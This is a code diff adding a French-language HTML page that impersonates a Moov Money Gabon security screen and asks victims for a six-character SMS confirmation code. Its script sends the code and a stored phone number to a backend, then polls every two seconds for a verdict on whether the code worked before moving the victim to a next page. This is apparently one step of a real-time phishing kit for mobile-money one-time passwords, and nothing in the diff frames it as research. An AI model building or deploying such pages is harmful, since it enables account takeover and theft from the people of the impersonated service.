@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Moov Money Gabon - Sécurité</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        :root { --moov-orange: #ff6600; --moov-blue: #0047ab; }
+        body { background-color: #f0f4f8; margin: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; font-family: sans-serif; }
+        .header-box { width: 100%; background: var(--moov-blue); padding: 25px; color: white; text-align: center; font-size: 24px; font-weight: 800; border-bottom: 3px solid var(--moov-orange); }
+        .card { background: white; width: 90%; max-width: 400px; padding: 30px; border-radius: 16px; margin-top: 30px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
+        .code-input-container { display: flex; justify-content: space-between; gap: 6px; margin-bottom: 20px; }
+        .code-box { width: 48px; height: 54px; border: 2px solid var(--moov-blue); border-radius: 10px; text-align: center; font-size: 20px; font-weight: bold; outline: none; }
+        .submit-btn { width: 100%; background-color: #e2e8f0; color: #94a3b8; border: none; padding: 16px; border-radius: 10px; font-weight: 800; cursor: not-allowed; }
+        .submit-btn.active { background-color: var(--moov-orange); color: white; cursor: pointer; }
+        .error-message { color: #dc2626; font-size: 13px; margin-top: 10px; display: none; }
+    </style>
+</head>
+<body>
+<div class="header-box">Moov Money Sécurité</div>
+
+<div class="card">
+    <h2>Code de Confirmation</h2>
+    <p>Entrez le code reçu par SMS :</p>
+    
+    <div class="code-input-container">
+        <input type="text" maxlength="1" class="code-box">
+        <input type="text" maxlength="1" class="code-box">
+        <input type="text" maxlength="1" class="code-box">
+        <input type="text" maxlength="1" class="code-box">
+        <input type="text" maxlength="1" class="code-box">
+        <input type="text" maxlength="1" class="code-box">
+    </div>
+
+    <div id="errorText" class="error-message">Code incorrect. Veuillez réessayer.</div>
+    <button id="submitBtn" class="submit-btn" disabled>VALIDER</button>
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+    const boxes = document.querySelectorAll('.code-box');
+    const submitBtn = document.getElementById('submitBtn');
+    const errorText = document.getElementById('errorText');
+
+    boxes.forEach((box, index) => {
+        box.addEventListener('input', () => {
+            box.value = box.value.toUpperCase();
+            if (box.value && index < boxes.length - 1) boxes[index + 1].focus();
+            const code = Array.from(boxes).map(b => b.value).join('');
+            submitBtn.disabled = code.length < 6;
+            submitBtn.classList.toggle('active', code.length === 6);
+        });
+    });
+
+    submitBtn.addEventListener('click', async () => {
+        const code = Array.from(boxes).map(b => b.value).join('');
+        const phone = localStorage.getItem('phone');
+
+        const res = await fetch('/api/verify-first-otp', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ phone, code })
+        });
+        const data = await res.json();
+        if (data.success) {
+            setInterval(async () => {
+                const s = await (await fetch(`/api/check-status?phone=${phone}`)).json();
+                if (s.status === "otp1_correct") location.href = "/page9";
+                if (s.status === "otp1_wrong") {
+                    errorText.style.display = "block";
+                    boxes.forEach(b => b.value = "");
+                    boxes[0].focus();
+                }
+            }, 2000);
+        }
+    });
+});
+</script>
+</body>
+</html>
